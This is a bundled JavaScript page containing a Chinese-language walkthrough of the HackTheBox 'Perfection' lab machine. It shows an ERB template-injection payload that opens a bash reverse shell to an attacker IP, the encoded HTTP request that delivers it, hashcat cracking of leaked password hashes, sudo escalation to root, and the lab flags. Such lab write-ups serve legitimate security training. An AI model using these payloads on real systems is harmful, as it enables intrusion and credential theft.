"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4233],{14756:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>c,toc:()=>o});var s=t(85893),r=t(11151);const a={},i="Perfection",c={id:"HackTheBox/Machines/Perfection/index",title:"Perfection",description:"Difficulty: Easy",source:"@site/docs/HackTheBox/Machines/Perfection/index.md",sourceDirName:"HackTheBox/Machines/Perfection",slug:"/HackTheBox/Machines/Perfection/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Perfection/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Perfection/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Monitored",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Monitored/"},next:{title:"Sherlocks",permalink:"/Target-Machines-WriteUp/docs/category/HackTheBox-Sherlocks"}},l={},o=[{value:"\u4fe1\u606f\u6536\u96c6",id:"\u4fe1\u606f\u6536\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"SSTI - Ruby",id:"ssti---ruby",level:2},{value:"User - susan",id:"user---susan",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"\u5bc6\u7801\u54c8\u5e0c\u7206\u7834",id:"\u5bc6\u7801\u54c8\u5e0c\u7206\u7834",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"perfection",children:"Perfection"}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Difficulty: Easy"}),(0,s.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,s.jsx)(n.h2,{id:"\u4fe1\u606f\u6536\u96c6",children:"\u4fe1\u606f\u6536\u96c6"}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,s.jsx)(n.p,{children:"TODO \u6dfb\u52a0\u63a2\u6d4b\u7ec6\u8282"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(58191).Z+"",width:"2560",height:"1542"})}),"\n",(0,s.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"Burp Suite"})," \u8fdb\u884c\u6293\u5305"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"POST /weighted-grade-calc HTTP/1.1\nHost: 10.10.11.253\nContent-Length: 161\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.10.11.253\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.10.11.253/weighted-grade-calc\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\ncategory1=as&grade1=1&weight1=100&category2=as&grade2=1&weight2=0&category3=as&grade3=1&weight3=0&category4=as&grade4=1&weight4=0&category5=as&grade5=1&weight5=0\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ssti---ruby",children:"SSTI - Ruby"}),"\n",(0,s.jsxs)(n.p,{children:["\u7ed3\u5408\u7f51\u7ad9\u6240\u4f7f\u7528\u7684\u6846\u67b6 ",(0,s.jsx)(n.code,{children:"WEBrick 1.7.0"})," \u4fe1\u606f\uff0c\u5c1d\u8bd5\u4f7f\u7528 SSTI \u8fdb\u884c\u6ce8\u5165"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby",children:"SSTI (Server Side Template Injection) - HackTricks"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"<%= system(\"bash -c'/bin/bash -i>& /dev/tcp/10.10.16.3/9999 0>&1'\") %>\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\u5904\u7406"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'abc%0a<%25=%20system("bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F9999%200%3E%261%27")%20%25>\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u53d1\u5305"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'POST /weighted-grade-calc HTTP/1.1\nHost: 10.10.11.253\nContent-Length: 281\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.10.11.253\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.10.11.253/weighted-grade-calc\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\ngrade1=1&weight1=100&category2=as&grade2=1&weight2=0&category3=as&grade3=1&weight3=0&category4=as&grade4=1&weight4=0&category5=as&grade5=1&weight5=0&category1=abc%0a<%25=%20system("bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F9999%200%3E%261%27")%20%25>\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,s.jsx)(n.h2,{id:"user---susan",children:"User - susan"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[10:25:46] Welcome to pwncat \ud83d\udc08!\n[10:49:20] received connection from 10.10.11.253:55950\n[10:49:29] 10.10.11.253:55950: registered new host w/ db\n(local) pwncat$ back\n(remote) susan@perfection:/home/susan/ruby_app$ whoami\nsusan\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) susan@perfection:/home/susan$ cat user.txt\nca7858ea6597f30db9a3318e380a8447\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) susan@perfection:/home/susan$ ls -lah\ntotal 48K\ndrwxr-x--- 7 susan susan 4.0K Feb 26 09:41 .\ndrwxr-xr-x 3 root  root  4.0K Oct 27 10:36 ..\nlrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null\n-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout\n-rw-r--r-- 1 susan susan 3.7K Feb 27  2023 .bashrc\ndrwx------ 2 susan susan 4.0K Oct 27 10:36 .cache\ndrwx------ 3 susan susan 4.0K Oct 27 10:36 .gnupg\nlrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null\ndrwxrwxr-x 3 susan susan 4.0K Oct 27 10:36 .local\ndrwxr-xr-x 2 root  root  4.0K Oct 27 10:36 Migration\n-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile\nlrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null\ndrwxr-xr-x 4 root  susan 4.0K Oct 27 10:36 ruby_app\nlrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null\n-rw-r--r-- 1 susan susan    0 Oct 27 06:41 .sudo_as_admin_successful\n-rw-r----- 1 root  susan   33 Mar  9 02:04 user.txt\n-rw-r--r-- 1 susan susan   39 Oct 17 12:26 .vimrc\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\u53d1\u73b0\u6709 ",(0,s.jsx)(n.code,{children:".sqlite_history"})," \u6587\u4ef6"]}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u627e\u5230 ",(0,s.jsx)(n.code,{children:"./Migration/pupilpath_credentials.db"})," \u6587\u4ef6\uff0c\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u6570\u636e\u5e93\u8bfb\u53d6"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u6709 ",(0,s.jsx)(n.code,{children:"user"})," \u8868"]}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"id"}),(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"name"}),(0,s.jsx)(n.th,{style:{textAlign:"center"},children:"password"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"1"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Susan Miller"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"2"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Tina Smith"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"3"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Harry Tyler"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"4"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"David Lawrence"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"5"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"Stephen Locke"}),(0,s.jsx)(n.td,{style:{textAlign:"center"},children:"154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8"})]})]})]}),"\n",(0,s.jsx)(n.p,{children:"\u6682\u65f6\u65e0\u6cd5\u786e\u5b9a\u54c8\u5e0c\u7684\u683c\u5f0f"}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u627e\u5230\u4e00\u5c01\u90ae\u4ef6 ",(0,s.jsx)(n.code,{children:"/var/spool/mail/susan"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students\n\nin our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:\n\n{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}\n\nNote that all letters of the first name should be convered into lowercase.\n\nPlease hit me with updates on the migration when you can. I am currently registering our university with the platform.\n\n- Tina, your delightful student\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u5bc6\u7801\u54c8\u5e0c\u7206\u7834",children:"\u5bc6\u7801\u54c8\u5e0c\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"PS D:\\_Tools\\hashcat-6.2.6> .\\hashcat.exe -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d --show\nabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5f97\u5230\u5bc6\u7801\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"sudo"})," \u4e86"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) susan@perfection:/var/spool/mail$ sudo -l\n[sudo] password for susan: <susan_nasus_413759210>\nMatching Defaults entries for susan on perfection:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser susan may run the following commands on perfection:\n    (ALL : ALL) ALL\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) susan@perfection:/var/spool/mail$ sudo -i\nroot@perfection:~# whoami\nroot\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@perfection:~# cat root.txt\n49af4f82e3665ca3d0f3187ea474e5f8\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},58191:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240323-102325-b6c77bb9fa81c2c30eb84c280f221d99.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>c,a:()=>i});var s=t(67294);const r={},a=s.createContext(r);function i(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);